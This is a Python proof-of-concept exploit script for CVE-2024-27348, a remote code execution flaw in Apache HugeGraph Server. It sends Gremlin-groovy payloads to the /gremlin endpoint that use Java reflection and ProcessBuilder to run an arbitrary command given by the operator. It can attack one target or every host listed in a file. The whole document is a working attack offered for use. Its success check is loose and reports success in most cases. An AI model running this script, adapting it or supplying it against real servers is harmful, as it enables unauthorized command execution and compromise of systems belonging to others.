import requests
import argparse
import json


def exploit(target, command):
    url = f"http://{target}/gremlin"
    headers = {
        "Content-Type": "application/json"
    }
    payload1 = {
        "gremlin": f"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"{command}\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {}
    }
    
    payload2 = {
        "gremlin": f"def result = \"{command}\".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField(result);",
    }
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload1), verify=False, timeout=4)
        if (response.status_code == 500 or response.status_code == 200) and ("\"code\":200" in response.text) and ("Failed to do request" not in response.text):
            print(f"[+] Command executed successfully with payload 1")
        else:
            print(f"[-] Request failed with status code: {response.status_code}")
            response = requests.post(url, headers=headers, data=json.dumps(payload2), verify=False, timeout=4)
        if (response.status_code == 200 or response.status_code == 500) or ("\"code\":200" in response.text) or ("Failed to do request" not in response.text):
            print(f"[+] Command executed successfully with payload 2")
        else:
            print(f"[-] Request failed with status code: {response.status_code}")

    except Exception as e:
            print(f"Exception with {target}")

def process_targets(file, command):
    with open(file, 'r') as f:
        for line in f:
            target = line.strip()
            exploit(target, command)


if __name__ == "__main__":
    print("Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server by kljunowsky")
    parser = argparse.ArgumentParser(
        description="Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server")
    parser.add_argument("-c", "--command", required=True, help="Command to execute on target")
    parser.add_argument("-f", "--file", required=False, help="Import targets from a file")
    parser.add_argument("-t", "--target", required=False, help="Target Domain/IP")
    args = parser.parse_args()

    if args.file:
        process_targets(args.file, args.command)
    elif args.target:
        exploit(args.target, args.command)
    else:
        print("Specify target with -t/--target or import targets from a file using -f/--file")
